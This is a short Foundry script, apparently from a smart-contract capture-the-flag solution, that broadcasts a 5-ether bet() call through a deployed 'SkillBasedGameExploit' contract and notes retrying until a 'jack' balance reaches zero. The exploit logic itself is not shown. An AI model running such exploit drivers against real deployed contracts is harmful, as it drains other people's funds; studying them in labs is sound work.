// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {SkillBasedGameExploit} from "src/SkillBasedGameExploit.sol";

contract SkillBasedGameScript is Script {
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        SkillBasedGameExploit exploit = SkillBasedGameExploit(
            payable(vm.envAddress("SkillBasedGameExploit"))
        );
        exploit.bet{value: 5 ether}();
        vm.stopBroadcast();
        // Is jack balance is zero. If not, try again
    }
}
